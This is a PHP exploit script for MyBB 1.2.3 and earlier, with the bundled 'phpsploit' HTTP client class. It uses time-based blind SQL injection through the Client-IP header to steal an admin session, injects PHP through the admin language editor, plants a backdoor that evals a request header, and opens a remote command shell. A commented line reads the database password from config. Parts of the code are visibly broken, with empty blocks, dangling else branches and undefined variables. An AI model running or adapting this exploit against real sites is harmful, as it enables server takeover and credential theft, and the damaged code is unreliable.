MyBulletinBoard (MyBB) <= 1.2.3 Remote Code Execution Exploit
=============================================================




#!/usr/bin/php
<?php
error_reporting(E_ALL ^ E_NOTICE);

# They corrected (not all) a lot of SQL requests which use the ipaddress, with $db->escape_string.
# They don&#039;t corrected the function (this is a choice ... the bad) and they forgot to correct 1 (only) SQL request.
# They must correct the problem at the source =)
#
if($argc < 3)
{
print("
---  MyBulletinBoard (MyBB) <= 1.2.3 Remote Code Execution Exploit  ---
-----------------------------------------------------------------------
  Usage: $argv[0] -url http://victim.com/ [Options]
 Params: -url       For example http://victim.com/myBB/
Options: -debug     Debug mod activated (debug_mybb.html)
         -truetime  Server response time which returns true
         -benchmark You can change the value used in benchmark()
         -proxy     If you wanna use a proxy <proxyhost:proxyport> 
         -proxyauth Basic authentification <proxyuser:proxypwd>
   Note: If you have some problems use -debug, -benchmark, -truetime
-----------------------------------------------------------------------
");exit(1);
}

$url       = getparam(&#039;url&#039;,1);
$debug     = (getparam(&#039;debug&#039;)!=&#039;&#039;)     ? 1 : 0;
$benchmark = (getparam(&#039;benchmark&#039;)!=&#039;&#039;) ? getparam(&#039;benchmark&#039;) : &#039;1000000&#039;;
$proxy     = getparam($proxy);
$proxyauth = getparam($proxyauth);

$backdoor  = &#039;uploads/avatars/backdoor.php&#039;; # inc/cache/backdoor.php
$filetoed  = &#039;index.lang.php&#039;;

$xpl = new phpsploit();
$xpl->agent(&#039;Firefox&#039;);
if($proxy) $xpl->proxy($proxy);
if($proxyauth) $xpl->proxyauth($proxyauth);
if($debug) debug(1);

# There is two solutions to be logged in as administrator.
#
# SOLUTION NUMBER 1
# mysql> select * from mybb_users\G
# *************************** 1. row ***************************
#              uid: 1
#         username: root
#         password: 39ac8681f5cf4fcd9c9c09719a618bd3
#             salt: BFeJBOCF
#         loginkey: VYLJia9InmLgM1PT6v2whyMbaoSuprngLnkW55j3zlywItyZBA...
#
# $xpl->post($url.&#039;admin/index.php&#039;,&#039;username=root&password=toor&do=login&goto=&#039;);
# print $xpl->getcontent(); // ...Welcome to the MyBB Administration Control Panel...
# 
# SOLUTION NUMBER 2
# mysql> select * from mybb_adminsessions\G
# *************************** 1. row ***************************
#        sid: 81e267263b9254f3aaf670383bfbfec9
#        uid: 1
#   loginkey: VYLJia9InmLgM1PT6v2whyMbaoSuprngLnkW55j3zlywItyZBA
#         ip: 127.0.0.1
#   dateline: 1175443967
# lastactive: 1175444369
#
# $xpl->addheader(&#039;Client-IP&#039;,&#039;127.0.0.1&#039;);
# $xpl->get($url.&#039;admin/index.php?adminsid=81e267263b9254f3aaf670383bfbfec9&#039;);
# print $xpl->getcontent(); // ...Welcome to the MyBB Administration Control Panel...
#
# I decided to use the solution number 2.
# We can also add an administrator (easily) ... but it&#039;s not interesting.
#
print "\nAdmin IP : "; $ip  = sql_inject(&#039;ip&#039;);
print "\nAdmin sid: "; $sid = sql_inject(&#039;sid&#039;);
print "\nTrying to be logged in as administrator";

$xpl->addheader(&#039;Client-IP&#039;,$ip);
$xpl->get($url."admin/languages.php?adminsid=$sid");

# Trying to find the language
else $lang=&#039;english&#039;;
print "\nLanguage: $lang";

# Language configuration
$xpl->get($url."admin/languages.php?adminsid=$sid&action=edit&lang=$lang&editwith=0&file=$filetoed");

# We can&#039;t use:
# - <? OR <?php
# - <script language="php">
# - &#039; OR "
#
$PHPCODE = &#039;${${error_reporting(0)}}&#039;
          .&#039;${${$handle=fopen(&#039;.chrit(&#039;./&#039;.$backdoor).&#039;,&#039;.chrit(&#039;w&#039;).&#039;)}}&#039;
          .&#039;${${fwrite($handle,&#039;.chrit(&#039;<?php error_reporting(0);eval($_SERVER[HTTP_SHELL]);exit(0); ?>&#039;).&#039;)}}&#039;
          .&#039;${${fclose($handle)}}&#039;;
$name_value[2][0] .= $PHPCODE;

$postdata=array(frmdt_url => $url.&#039;admin/languages.php&#039;,
               "adminsid" => $sid, "action" => "do_edit",
               "lang" => $lang, "editwith" => 0,
               "inadmin"=> 0, "file"=> $filetoed,
               "Update Language Variables"=>"  Update Language Variables");

for($i=0;$i<count($name_value[1]);$i++)	$postdata[html_entity_decode($name_value[1][$i])] = html_entity_decode($name_value[2][$i]);

# print $xpl->showlastrequest();
$xpl->formdata($postdata);

# Trying to execute the php code
$xpl->get($url.&#039;index.php&#039;);

# If not the default language
$xpl->get($url.&#039;inc/languages/&#039;.$lang.&#039;/&#039;.$filetoed);
print "\nThe php file should be created\n\$shell> ";

# Hello master
{
    # &#039;);include(&#039;../../inc/config.php&#039;);print $config[&#039;password&#039;];//
    $xpl->addheader(&#039;Shell&#039;,"system(&#039;$cmd&#039;);");
    $xpl->get($url.$backdoor);
    print $xpl->getcontent()."\n\$shell> ";
}

function sql_inject($field)
{
	$sub=0;$string=&#039;&#039;;
	
	if($field==&#039;ip&#039;) {$a=&#039;44&#039;;$b=&#039;57&#039;;} # . 0-9
	else {$a=&#039;46&#039;;$b=&#039;70&#039;;}             # 0-9 A-Z
	
	while(TRUE)
	{
		$sub++;
		for($i=$a;$i<=$b;$i++)
		{
			# Random ip
			$fakeip = rand(128,254).&#039;.&#039;
			         .rand(128,254).&#039;.&#039;
			         .rand(128,254).&#039;.&#039;
			         .rand(128,254);

			# Calculation of the server response time which returns TRUE
			if($i==$a) $f=&#039;TST&#039;;
			
			# End of the string ?
			elseif($i==($a+1)) $f=&#039;NULL&#039;;
			
			# Test the char
			else $f=$i;
			
			if($sub==1 AND $i==$a)
			{
				$xpl->addheader(&#039;Client-IP&#039;,$fakeip."&#039;<script>alert(666)</script>");
				$xpl->get($url.&#039;index.php&#039;);

			}

			# +-class_session.php (#2)
			# |
			# 475.	function create_session($uid=0)
			# 476.	{
			# 477.		global $db;
			# 478.		$speciallocs = $this->get_special_locations();
			# 479.
			# 480.		// If there is a proper uid, delete by uid.
			# 481.		if($uid > 0)
			# 482.		{
			# 483.			$db->delete_query(TABLE_PREFIX."sessions", "uid=".$uid);
			# 484.			$onlinedata[&#039;uid&#039;] = $uid;
			# 485.		}
			# 486.		// Else delete by ip.
			# 487.		else
			# 488.		{   // $this->ipaddress = get_ip();
			# 489.			$db->delete_query(TABLE_PREFIX."sessions", "ip=&#039;".$this->ipaddress."&#039;");
			# 490.			$onlinedata[&#039;uid&#039;] = 0;
			# 491.		}
			#
			$sql  = $fakeip."&#039; OR ip=(SELECT IF(SUBSTR(";
			$sql .= ($f==&#039;TST&#039;) ? ",1" : ",$sub";
			$sql .= ($f==&#039;TST&#039;) ? ",1)=CHAR(49)" : ",1)=CHAR($f)";
			$sql .= ",BENCHMARK($benchmark,CHAR(66)),1)) #";


			# +-functions.php (#1)
			# |
			# 1836. function get_ip()
			# 1837. {
			# 1838.	if(isset($_SERVER[&#039;HTTP_X_FORWARDED_FOR&#039;]))
			# 1839.	{
			# 1841.		{
			# 1842.			foreach($addresses[0] as $key => $val)
			# 1843.			{
			# 1845.				{
			# 1846.					$ip = $val;
			# 1847.					break;
			# 1848.				}
			# 1849.			}
			# 1850.		}
			# 1851.	}
			# 1852.	if(!isset($ip))
			# 1853.	{
			# 1854.		if(isset($_SERVER[&#039;HTTP_CLIENT_IP&#039;]))
			# 1855.		{
			# 1856.			$ip = $_SERVER[&#039;HTTP_CLIENT_IP&#039;];
			# 1857.		}
			# 1858.		else
			# 1859.		{
			# 1860.			$ip = $_SERVER[&#039;REMOTE_ADDR&#039;];
			# 1861.		}
			# 1862.	}
			# 1863.	return $ip;
			# 1864. }
			#
			$bef = time();
			$xpl->reset(&#039;header&#039;);
			$xpl->addheader(&#039;Client-IP&#039;,$sql);
			$xpl->get($url.&#039;index.php&#039;);
			$aft = time();
			
			if($f==&#039;TST&#039;) $truetime=$aft-$bef;
			if(getparam(&#039;truetime&#039;)!=&#039;&#039;) $truetime=getparam(&#039;truetime&#039;);
			
			# Server response time >= Server response time which returns TRUE ?
			$restime = $aft-$bef;
			if($restime >= $truetime AND $f != &#039;TST&#039;) $result=&#039;TRUE&#039;;
			else $result=&#039;FALSE&#039;;

			# Debug mode activated
			if($debug) debug(&#039;&#039;,$field);
			
			# The tested char returns TRUE
			if($result==&#039;TRUE&#039;)
			{
				if($f!=&#039;NULL&#039;)
				{
					# Continue
					print strtolower(chr($f));
					$string .= chr($f);
					break;
				}
				else
				{
					# End of the string
					$xpl->reset(&#039;header&#039;);
					return $string;
				}
			}
			
			# Retry if no char found
			if($f==$b) $sub--;
		}
	}
}

function debug($init=&#039;&#039;,$dafield=&#039;&#039;)
{
	global $result,$bef,$aft,$truetime,$benchmark,$a,$b,$sub,$f; #,$fakeip
	if($init)
	{
		$handle = fopen("debug_mybb.html","w+");
		$data = "<h1><div align=&#039;center&#039;>MyBulletinBoard (MyBB) <= 1.2.3 Code Execution Exploit</div></h1>
		<td align=&#039;center&#039;><b>REQUEST TIME</b></td>
		<td align=&#039;center&#039;><b>RESPONSE TIME</b></td>
		<td align=&#039;center&#039;><b>TRUETIME</b></td>
		<td align=&#039;center&#039;><b>BENCHMARK</b></td>
		<td align=&#039;center&#039;><b>RESULT</b></td>";
		# <td align=&#039;center&#039;><b>IP</b></td>
		$data .= "<td align=&#039;center&#039;><b>FIELD</b></td>
		<td align=&#039;center&#039;><b>CHARSET</b></td>
		<td align=&#039;center&#039;><b>SUBSTR()</b></td>
		<td align=&#039;center&#039;><b>ORD()</b></td>
		<td align=&#039;center&#039;><b>CHAR()</b></td>";
		fwrite($handle,$data);
		fclose($handle);
	}
	else
	{
		$handle = fopen("debug_mybb.html","a");
		$data   = "<tr".(($result==&#039;TRUE&#039;) ? " bgcolor=&#039;#FFFF00&#039;" : "").">
		<td align=&#039;center&#039;>&nbps;".htmlentities($bef)."&nbps;</td>
		<td align=&#039;center&#039;>&nbps;".htmlentities($aft)."&nbps;</td>
		<td align=&#039;center&#039;>&nbps;".htmlentities($truetime)."&nbps;</td>
		<td align=&#039;center&#039;>&nbps;".htmlentities($benchmark)."&nbps;</td>
		<td align=&#039;center&#039;>&nbps;".htmlentities($result)."&nbps;</td>";
		# <td align=&#039;center&#039;>&nbps;".htmlentities($fakeip)."&nbps;</td>
		$data .= "<td align=&#039;center&#039;>&nbps;".htmlentities($dafield)."&nbps;</td>
		<td align=&#039;center&#039;>&nbps;".htmlentities("$a-$b")."&nbps;</td>
		<td align=&#039;center&#039;>&nbps;".htmlentities($sub)."&nbps;</td>
		<td align=&#039;center&#039;>&nbps;".htmlentities($f)."&nbps;</td>
		<td align=&#039;center&#039;>&nbps;".htmlentities(chr($f))."&nbps;</td></tr>";
		fwrite($handle,$data);
		fclose($handle);
	}
}

function chrit($string)
{
	$char = &#039;&#039;;
	for($i=0;$i<strlen($string);$i++)
	{
		$char .= &#039;chr(&#039;.ord($string[$i]).&#039;)&#039;;
		$char .= ($i != (strlen($string)-1)) ? &#039;.&#039; : &#039;&#039;;
	}
	return $char;
}

function getparam($param,$opt=&#039;&#039;)
{
	global $argv;
	foreach($argv as $value => $key)
	{
		if($key == &#039;-&#039;.$param) {
		   if(!empty($argv[$value+1])) return $argv[$value+1];
		   else return 1;
		}
	}
	if($opt) exit("\n-$param parameter required");
	else return;
}

/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 5 (remove "private", "public" if you have PHP 4)
 * VERSION:        1.2
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit {

	/**
	 * This function is called by the get()/post() functions.
	 * You don&#039;t have to call it, this is the main function.
	 *
	 * @return $server_response
	 */
	private function sock()
	{
		if(!empty($this->proxyhost) && !empty($this->proxyport)) $socket = fsockopen($this->proxyhost,$this->proxyport);
		else $socket = fsockopen($this->host,$this->port);
		
		if(!$socket) die("Error: The host doesn&#039;t exist");
		
		if($this->method==="get") $this->packet = "GET ".$this->url." HTTP/1.1\r\n";
		elseif($this->method==="post" or $this->method==="formdata") $this->packet = "POST ".$this->url. " HTTP/1.1\r\n";
		else die("Error: Invalid method");
		
		if(!empty($this->proxyuser)) $this->packet .= "Proxy-Authorization: Basic ".base64_encode($this->proxyuser.":".$this->proxypass)."\r\n";
		$this->packet .= "Host: ".$this->host."\r\n";
		
		if(!empty($this->agent))  $this->packet .= "User-Agent: ".$this->agent."\r\n";
		if(!empty($this->header)) $this->packet .= $this->header."\r\n";
		if(!empty($this->cookie)) $this->packet .= "Cookie: ".$this->cookie."\r\n";
		
		$this->packet .= "Connection: Close\r\n";
		if($this->method==="post")
		{
			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
			$this->packet .= "Content-Length: ".strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data."\r\n";
		}
		elseif($this->method==="formdata")
		{
			$this->packet .= "Content-Type: multipart/form-data; boundary=---------------------------".$this->boundary."\r\n";
			$this->packet .= "Content-Length: ".strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data;
		}
		$this->packet .= "\r\n";
		$this->recv = &#039;&#039;;
		
		fputs($socket,$this->packet);
		while(!feof($socket)) $this->recv .= fgets($socket);
		fclose($socket);
		
		if($this->cookiejar) $this->cookiejar($this->getheader($this->recv));
		if($this->allowredirection) return $this->allowredirection($this->recv);
		else return $this->recv;
	}
	

	/**
	 * This function allows you to add several cookie in the
	 * request. Several methods are supported:
	 * 
	 * $this->addcookie("name","value");
	 * or
	 * $this->addcookie("name=newvalue");
	 * or
	 * $this->addcookie("othername=overvalue; xx=zz; y=u");
	 * 
	 * @param string $cookiename
	 * @param string $cookievalue
	 * 
	 */
	public function addcookie($cookn,$cookv=&#039;&#039;)
	{
		// $this->addcookie("name","value"); work avec replace
		if(!empty($cookv))
		{
			if($cookv === "deleted") $cookv=&#039;&#039;; // cookiejar(1) && Set-Cookie: name=delete
			if(!empty($this->cookie))
			{
			    {
			    }
			    else
			    {
			    	$this->cookie .= " ".$cookn."=".$cookv.";"; // " ".
			    }
			}
			else
			{
				$this->cookie = $cookn."=".$cookv.";";
			}
		}
		// $this->addcookie("name=value; othername=othervalue");
		else
		{
	    	 if(!empty($this->cookie))
	    	 {
	    	 	$cookarr = explode(";",str_replace(" ", "",$cookn));
	    	 	for($i=0;$i<count($cookarr);$i++)
	    	 	{
	    	 		$cookn = $matches[1];
	    	 		$cookv = $matches[2];
	    	 		$this->addcookie($cookn,$cookv);
	    	 	}
	    	 }
			 else
			 {
			 	$cookn = ((substr($cookn,(strlen($cookn)-1),1))===";") ? $cookn : $cookn.";";
			 	$this->cookie = $cookn;			
			 }
		}
	}
	
	
	/**
	 * This function allows you to add several headers in the
	 * request. Several methods are supported:
	 *
	 * $this->addheader("headername","headervalue");
	 * or
	 * $this->addheader("headername: headervalue");
	 *
	 * @param string $headername
	 * @param string $headervalue
	 */
	public function addheader($headern,$headervalue=&#039;&#039;)
	{
		// $this->addheader("name","value");
		if(!empty($headervalue))
		{
			if(!empty($this->header))
			{
				{
				}
				else
				{
					$this->header .= "\r\n".$headern.": ".$headervalue;
				}
			}
			else
			{
				$this->header=$headern.": ".$headervalue;
			}
		}
		// $this->addheader("name: value");
		else 
		{
			if(!empty($this->header))
			{
				$headarr = explode(": ",$headern);
				$headern = $headarr[0];
				$headerv = $headarr[1];
				$this->addheader($headern,$headerv);
			}
			else
			{
				$this->header=$headern;
			}
		}
	}
	

	/**
	 * This function allows you to use an http proxy server.
	 * Several methods are supported:
	 * 
	 * $this->proxy("proxyip","8118");
	 * or
	 * $this->proxy("proxyip:8118")
	 *
	 * @param string $proxyhost
	 * @param integer $proxyport
	 */
	public function proxy($proxy,$proxyp=&#039;&#039;)
	{
		// $this->proxy("localhost:8118");
		if(empty($proxyp))
		{
			$proxh = $proxarr[1];
			$proxp = $proxarr[2];
			$this->proxyhost=$proxh;
			$this->proxyport=$proxp;
		}
		// $this->proxy("localhost",8118);
		else 
		{
			$this->proxyhost=$proxy;
			$this->proxyport=intval($proxyp);
		}
		if($this->proxyport > 65535) die("Error: Invalid port number");
	}
	

	/**
	 * This function allows you to use an http proxy server
	 * which requires a basic authentification. Several
	 * methods are supported:
	 * 
	 * $this->proxyauth("darkfig","dapasswd");
	 * or
	 * $this->proxyauth("darkfig:dapasswd");
	 *
	 * @param string $proxyuser
	 * @param string $proxypass
	 */
	public function proxyauth($proxyauth,$proxypasse=&#039;&#039;)
	{
		// $this->proxyauth("darkfig:password");
		if(empty($proxypasse))
		{
			$proxu = $proxautharr[1];
			$proxp = $proxautharr[2];
			$this->proxyuser=$proxu;
			$this->proxypass=$proxp;
		}
		// $this->proxyauth("darkfig","password");
		else
		{
			$this->proxyuser=$proxyauth;
			$this->proxypass=$proxypasse;
		}
	}

	
	/**
	 * This function allows you to set the "User-Agent" header.
	 * Several methods are possible to do that:
	 * 
	 * $this->agent("Mozilla Firefox");
	 * or
	 * $this->addheader("User-Agent: Mozilla Firefox");
	 * or
	 * $this->addheader("User-Agent","Mozilla Firefox");
	 * 
	 * @param string $useragent
	 */
	public function agent($useragent)
	{
		$this->agent=$useragent;
	}

	
	/**
	 * This function returns the header which will be
	 * in the next request.
	 * 
	 * $this->showheader();
	 *
	 * @return $header
	 */
	public function showheader()
	{
		return $this->header;
	}

	
	/**
	 * This function returns the cookie which will be
	 * in the next request.
	 * 
	 * $this->showcookie();
	 *
	 * @return $storedcookies
	 */
	public function showcookie()
	{
		return $this->cookie;
	}

	
	/**
	 * This function returns the last formed
	 * http request (the http packet).
	 * 
	 * $this->showlastrequest();
	 * 
	 * @return $last_http_request
	 */
	public function showlastrequest()
	{
		return $this->packet;
	}
	
	
	/**
	 * This function sends the formed http packet with the
	 * 
	 * $this->get("http://localhost");
	 * $this->get("http://localhost:888/xd/tst.php");
	 * 
	 * @param string $urlwithpath
	 * @return $server_response
	 */
	public function get($url)
	{
		$this->target($url);
		$this->method="get";
		return $this->sock();
	}

	
	/**
	 * This function sends the formed http packet with the
	 * 
	 * $this->post("http://localhost/index.php","admin=1&user=dark");
	 *
	 * @param string $urlwithpath
	 * @param string $postdata
	 * @return $server_response
	 */	
	public function post($url,$data)
	{
		$this->target($url);
		$this->method="post";
		$this->data=$data;
		return $this->sock();
	}
	

	/**
	 * This function sends the formed http packet with the
	 * POST method using the multipart/form-data enctype. 
	 * 
	 * $array = array(
	 *          frmdt_url      => "http://localhost/upload.php",
	 *          frmdt_boundary => "123456",                    # Optional
	 *                 "email" => "me@u.com",
	 *               "varname" => array(
	 *                            frmdt_type => "image/gif",   # Optional
	 *                       frmdt_transfert => "binary",      # Optional
	 *                        frmdt_filename => "hello.php",
	 *                         frmdt_content => "<?php echo &#039;:)&#039;; ?>"));
	 * $this->formdata($array);
	 *
	 * @param array $array
	 * @return $server_response
	 */
	public function formdata($array)
	{
		$this->target($array[frmdt_url]);
		$this->method="formdata";
		$this->data=&#039;&#039;;
		if(!isset($array[frmdt_boundary])) $this->boundary="phpsploit";
		else $this->boundary=$array[frmdt_boundary];
		foreach($array as $key => $value)
		{
			{
				$this->data .= "-----------------------------".$this->boundary."\r\n";
				$this->data .= "Content-Disposition: form-data; name=\"".$key."\";";
				if(!is_array($value))
				{
					$this->data .= "\r\n\r\n".$value."\r\n";
				}
				else
				{
					$this->data .= " filename=\"".$array[$key][frmdt_filename]."\";\r\n";
					if(isset($array[$key][frmdt_type])) $this->data .= "Content-Type: ".$array[$key][frmdt_type]."\r\n";
					if(isset($array[$key][frmdt_transfert])) $this->data .= "Content-Transfer-Encoding: ".$array[$key][frmdt_transfert]."\r\n";
					$this->data .= "\r\n".$array[$key][frmdt_content]."\r\n";
				}
			}
		}
		$this->data .= "-----------------------------".$this->boundary."--\r\n";
		return $this->sock();
	}

	
	/**
	 * This function returns the content of the server response
	 * without the headers.
	 * 
	 * $this->getcontent($this->get("http://localhost/"));
	 * or
	 * $this->getcontent();
	 *
	 * @param string $server_response
	 * @return $onlythecontent
	 */
	public function getcontent($code=&#039;&#039;)
	{
		if(empty($code)) $code = $this->recv;
		$content = explode("\n",$code);
		$onlycode = &#039;&#039;;
		for($i=1;$i<count($content);$i++)
		{
			if($ok) $onlycode .= $content[$i]."\n";
		}
		return $onlycode;
	}

	
	/**
	 * This function returns the headers of the server response
	 * without the content.
	 * 
	 * $this->getheader($this->post("http://localhost/x.php","x=1&z=2"));
	 * or
	 * $this->getheader();
	 *
	 * @param string $server_response
	 * @return $onlytheheaders
	 */
	public function getheader($code=&#039;&#039;)
	{
		if(empty($code)) $code = $this->recv;
		$header = explode("\n",$code);
		$onlyheader = $header[0]."\n";
		for($i=1;$i<count($header);$i++)
		{
			$onlyheader .= $header[$i]."\n";
		}
		return $onlyheader;
	}

	
	/**
	 * This function is called by the cookiejar() function.
	 * It adds the value of the "Set-Cookie" header in the "Cookie"
	 * header for the next request. You don&#039;t have to call it.
	 * 
	 * @param string $server_response
	 */
	private function getcookie($code)
	{
		$carr = explode("\n",str_replace("\r\n","\n",$code));
		for($z=0;$z<count($carr);$z++)
		{
			{
			}
		}

		for($i=0;$i<count($cookie);$i++)
		{
	    	        $cookn = $matches[1];
	    	        $cookv = $matches[2];
	    	        $this->addcookie($cookn,$cookv);
		}
    }

	
	/**
	 * This function is called by the get()/post() functions.
	 * You don&#039;t have to call it.
	 *
	 * @param string $urltarg
	 */
	private function target($urltarg)
	{
		$this->url=$urltarg;
		
		$this->host=$array[0];

		$this->port=empty($matches[1]) ? 80 : $matches[1];
		
		$this->path=str_replace("//","/","/".$matches[1]."/");
	
		if($this->port > 65535) die("Error: Invalid port number");
	}
	
	
	/**
	 * If you call this function, the script will
	 * extract all "Set-Cookie" headers values
	 * and it will automatically add them into the "Cookie" header
	 * for all next requests.
	 *
	 * $this->cookiejar(1); // enabled
	 * $this->cookiejar(0); // disabled
	 * 
	 */
	public function cookiejar($code)
	{
		if($code===0) $this->cookiejar=&#039;&#039;;
		if($code===1) $this->cookiejar=1;
		else
		{
			$this->getcookie($code);
		}
	}


	/**
	 * If you call this function, the script will
	 * follow all redirections sent by the server.
	 * 
	 * $this->allowredirection(1); // enabled
	 * $this->allowredirection(0); // disabled
	 * 
	 * @return $this->get($locationresponse)
	 */
	public function allowredirection($code)
	{
		if($code===0) $this->allowredirection=&#039;&#039;;
		if($code===1) $this->allowredirection=1;
		else
		{
			{
				$location = str_replace(chr(13),&#039;&#039;,$codearr[2]);
				if(!eregi("://",$location))
				{
					return $this->get("http://".$this->host.$this->path.$location);
				}
				else
				{
					return $this->get($location);
				}
			}
			else
			{
				return $code;
			}
		}
	}
	
	
	/**
	 * This function allows you to reset some parameters:
	 * 
	 * $this->reset(header); // headers cleaned
	 * $this->reset(cookie); // cookies cleaned
	 * $this->reset();       // clean all parameters
	 *
	 * @param string $func
	 */
	public function reset($func=&#039;&#039;)
	{
		switch($func)
		{
			case "header":
			$this->header=&#039;&#039;;
			break;
			
			case "cookie":
			$this->cookie=&#039;&#039;;
			break;
			
			default:
		        $this->cookiejar=&#039;&#039;;
		        $this->header=&#039;&#039;;
		        $this->cookie=&#039;&#039;;
		        $this->allowredirection=&#039;&#039;; 
		        $this->agent=&#039;&#039;;
		        break;
		}
	}
}
?>



